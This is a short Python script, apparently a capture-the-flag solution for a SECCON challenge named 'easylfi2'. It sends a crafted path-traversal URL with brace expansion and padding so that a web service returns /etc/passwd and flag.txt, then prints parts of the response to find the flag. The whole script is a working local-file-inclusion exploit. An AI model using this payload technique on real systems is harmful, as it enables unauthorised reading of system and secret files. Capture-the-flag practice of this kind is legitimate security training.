import requests

# url = f'http://easylfi2.dom.seccon.games:3000/../../../../../../../../../{"{" + "bin/tar"+"etc/passwd,"*1020 + "x"*831 + ",flag.txt" + ",x" + "}"}'
url = f'http://easylfi2.dom.seccon.games:3000/../../../../../../../../../{"{" + "bin/tar,"+"etc/passwd,"*130 + "x"*1300+ ",flag.txt" + ",x" + "}"}'
s = requests.Session()
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False)
j = r.json()
print(j.keys())
# print(j['stdout'])
print(j['code'])
print(len(j['stdout']))
print("SECCON" in j['stdout'])
print(j['stdout'][-40:])
del j['stdout']
del j['stderr']
del j['cmd']
print(j)
